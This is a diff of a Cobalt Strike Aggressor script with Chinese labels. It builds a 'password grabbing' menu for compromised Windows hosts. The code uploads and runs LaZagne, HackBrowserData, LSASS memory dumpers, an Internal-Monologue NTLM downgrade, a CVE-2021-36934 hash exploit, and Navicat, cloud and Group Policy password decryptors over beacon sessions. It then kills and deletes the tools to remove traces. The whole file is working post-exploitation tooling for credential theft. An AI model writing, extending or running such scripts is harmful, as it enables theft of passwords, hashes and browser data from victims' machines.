@@ -1,4 +1,4 @@
-menu "密码抓取" {
+menu "☆ 密码抓取" {
   menu "Mimikatz" {
     item "logonpasswords" {
       $bid = $1['@'];
@@ -163,82 +163,36 @@ menu "密码抓取" {
       bmimikatz($1, "sekurlsa::credman");
     }    
   }
-	item "LaZagne 检索主机密码" {   # https://github.com/AlessandroZ/LaZagne
-    local('$bid');
+	menu "LaZagne 检索主机密码" {   # https://github.com/AlessandroZ/LaZagne
+    item "上传 LaZagne" {
+      $bid = $1;
+      $dialog = dialog("上传 lazagne", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &lazagne);
+      dialog_description($dialog, "LaZagne 不免杀，请在无AV的机器上运行。项目地址：https://github.com/AlessandroZ/LaZagne");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub lazagne{
+      bcd($bid, $3['UploadPath']);
+			bupload($bid, script_resource("/scripts/PassCapture/lazagne.exe"));
+    }
+    item "运行 LaZagne"{
+      bshell($bid, "lazagne.exe all");
+    }
+    item "删除 LaZagne"{
+      local('$bid');
       foreach $bid ($1){
-      lazagne_password($bid);
+        bshell($1, "taskkill -f /im lazagne.exe & del /f /s /q lazagne.exe");
+        bshell($bid, "del C:\\Windows\\Temp\\lazagne.exe");
       }
-	}
-  sub lazagne_password{
-    $binary = script_resource("/scripts/PassCapture/lazagne.exe");
-    $help = "The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer";
-    beacon_command_register("lazagne", $help, "The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer\n\n$help");
-    if(!-exists $binary){
-      berror($1, "lazagne binary cannot be found at $binary");
-      return;
     }
-    bcd($1, "C:\\Users\\Public\\");
-    bupload($1, $binary);
-    brun($1, "lazagne.exe all");
-    bshell($bid, "taskkill -f /im lazagne.exe & del /f /s /q lazagne.exe");
-  }
-
-	item "Internal-Monologue" {# 参考 https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D
-    local('$bid');
-        foreach $bid ($1){
-        internal_monologue($bid);
-        }
-	}
-  sub internal_monologue{
-    $binary = script_resource("/scripts/PassCapture/InternalMonologue.exe");
-    $help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
-    beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
-    if(!-exists $binary)
-    {
-      berror($1, "InternalMonologue binary cannot be found at $binary");
-      return;
-    }
-    $args = "-Downgrade True -Verbose True";
-    bexecute_assembly($1, $binary, $args);
-  }  
-  item "DumpLsassMemory"{
-      $dialog = dialog("QAQ",%(bid => $1["@"] , pid => "1024") ,&DumpLsassMemorys);
-    dialog_description($dialog,"请输入Lsass's pid");
-    drow_text($dialog,"pid","pid:");
-    dbutton_action($dialog,"Exploit");
-    dialog_show($dialog);
-  }
-  sub DumpLsassMemorys{
-      $binary = script_resource("/scripts/PassCapture/MiniDumpLsass.exe");
-      bexecute_assembly($3["bid"],$binary,$3['pid']);
-  }
-  item "CVE-2021-36934(Win10GetHash)"{
-    $binary = script_resource("/scripts/PassCapture/CVE-2021-36934.exe");
-    bexecute_assembly($1["@"],$binary);
-  }
-  item "Navicat-Password" {
-    local('$bid');
-        foreach $bid ($1){
-        navicat_password($bid);
-        }
-	}
-  sub navicat_password{
-    $binary = script_resource("/scripts/PassCapture/navicatpwd.exe");
-    $help = "Automatic access to Navicat connection information and password";
-    beacon_command_register("navicat", $help, "Use: navicat <Automatically export all and decrypt>\nnavicat 12 <Decrypt with 12 algorithms> OR navicat 15057D7BA390\nnavicat 15057D7BA390 12<Decrypt the password of parameter one with 12 algorithm>\n\n$help");
-    if(!-exists $binary)
-    {
-      berror($1, "Navicat binary cannot be found at $binary");
-      return;
-    }
-    bexecute_assembly($1, $binary);
   }
 
   menu "抓取浏览器数据及密码" {
-    menu "hack-browser-data" {
-      item "上传hack-browser-data" {
+    menu "HackBrowserData" { 
+      item "上传 HackBrowserData" {
         $bid = $1;
-        $dialog = dialog("上传 hack-browser-data", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &hack-browser-data);
+        $dialog = dialog("上传 HackBrowserData", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &hack-browser-data);
         dialog_description($dialog, "全平台支持，软件地址：https://github.com/moonD4rk/HackBrowserData");
         drow_text($dialog, "UploadPath",  "上传路径: ");
         dbutton_action($dialog, "上传");
@@ -246,12 +200,16 @@ menu "密码抓取" {
       }
       sub hack-browser-data {
         bcd($bid, $3['UploadPath']);
-        bupload($bid, script_resource("/scripts/PassCapture/hack-browser-data.exe"));
-        }
+        if (-is64 $bid['id']) {
+          bupload($bid, script_resource("/scripts/PassCapture/HackBrowserData/x64/hack-browser-data.exe"));
+        }else{
+          bupload($bid, script_resource("/scripts/PassCapture/HackBrowserData/x86/hack-browser-data.exe"));
+        }         
+      }
 
-      item "运行hack-browser-data"{
+      item "运行 HackBrowserData"{
         $bid = $1['@'];
-        $Dialog = dialog("运行hack-browser-data",%(bid => $bid),&hack-browser-data_run);
+        $Dialog = dialog("运行 HackBrowserData",%(bid => $bid),&hack-browser-data_run);
         dialog_description($Dialog, "运行后会在当前目录下生成results文件夹，所有结果都在里面");
         dbutton_action($Dialog, "运行");
         btask($bid, "运行后会在当前目录下生成results文件夹，所有结果都在里面", "");
@@ -296,7 +254,62 @@ menu "密码抓取" {
       bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpChromium.exe"), $3['Type']);
     }   
   }
+  separator();
 
+
+	item "LsassDump (WindowsAPI)" {   # https://github.com/Ryze-T/Windows_API_Tools
+    local('$bid');
+      foreach $bid ($1){
+      LsassDump($bid);
+      }
+	}
+  sub LsassDump{
+    bcd($1, "C:\\Users\\Public\\");
+    if (-is64 $bid['id']) {
+      bupload($bid, script_resource("/scripts/PassCapture/x64/LsassDump.exe"));
+    }else{
+      bupload($bid, script_resource("/scripts/PassCapture/x86/LsassDump.exe"));
+    }    
+    brun($1, "LsassDump.exe");
+    bshell($bid, "taskkill -f /im LsassDump.exe & del /f /s /q LsassDump.exe");
+  }
+
+	item "Internal-Monologue" {# 参考 https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D
+    local('$bid');
+        foreach $bid ($1){
+        internal_monologue($bid);
+        }
+	}
+  sub internal_monologue{
+    $binary = script_resource("/scripts/PassCapture/InternalMonologue.exe");
+    $help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
+    beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
+    if(!-exists $binary)
+    {
+      berror($1, "InternalMonologue binary cannot be found at $binary");
+      return;
+    }
+    $args = "-Downgrade True -Verbose True";
+    bexecute_assembly($1, $binary, $args);
+  }  
+  item "DumpLsassMemory"{
+      $dialog = dialog("QAQ",%(bid => $1["@"] , pid => "1024") ,&DumpLsassMemorys);
+    dialog_description($dialog,"请输入Lsass's pid");
+    drow_text($dialog,"pid","pid:");
+    dbutton_action($dialog,"Exploit");
+    dialog_show($dialog);
+  }
+  sub DumpLsassMemorys{
+      $binary = script_resource("/scripts/PassCapture/MiniDumpLsass.exe");
+      bexecute_assembly($3["bid"],$binary,$3['pid']);
+  }
+
+  separator();
+
+  item "CVE-2021-36934 (Win10GetHash)"{
+    $binary = script_resource("/scripts/PassCapture/CVE-2021-36934.exe");
+    bexecute_assembly($1["@"],$binary);
+  }
 
   menu "本地程序文件密码解密" {
     item "SharpCloud(获取云凭证)" {
@@ -311,6 +324,25 @@ menu "密码抓取" {
       $arg = join(' ',  @($3['type']));
       bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpCloud.exe"), $arg);
     }
+    
+    item "Navicat-Password" {
+      local('$bid');
+          foreach $bid ($1){
+          navicat_password($bid);
+          }
+    }
+    sub navicat_password{
+      $binary = script_resource("/scripts/PassCapture/navicatpwd.exe");
+      $help = "Automatic access to Navicat connection information and password";
+      beacon_command_register("navicat", $help, "Use: navicat <Automatically export all and decrypt>\nnavicat 12 <Decrypt with 12 algorithms> OR navicat 15057D7BA390\nnavicat 15057D7BA390 12<Decrypt the password of parameter one with 12 algorithm>\n\n$help");
+      if(!-exists $binary)
+      {
+        berror($1, "Navicat binary cannot be found at $binary");
+        return;
+      }
+      bexecute_assembly($1, $binary);
+    }
+
     menu "SharpDecryptPwd(from uknowsec)" {
       item "SharpDecryptPwd" {
         $bid = $1['@'];
@@ -366,7 +398,7 @@ menu "密码抓取" {
     }
   }
 
-  item "Net-GPPPassword(组策略帐户凭据)" {
+  item "Net-GPPPassword (组策略帐户凭据)" {
     blog($1, ".NET实现的Get-GPPPassword。检索通过组策略首选项推送的帐户的明文密码和其他信息。该技术很旧，但是在很早以前创建域的环境中仍然很有用。项目地址：https://github.com/outflanknl/Net-GPPPassword")
     bexecute_assembly($1, script_resource("/scripts/PassCapture/Net-GPPPassword_dotNET_v2.exe"), "");
   }
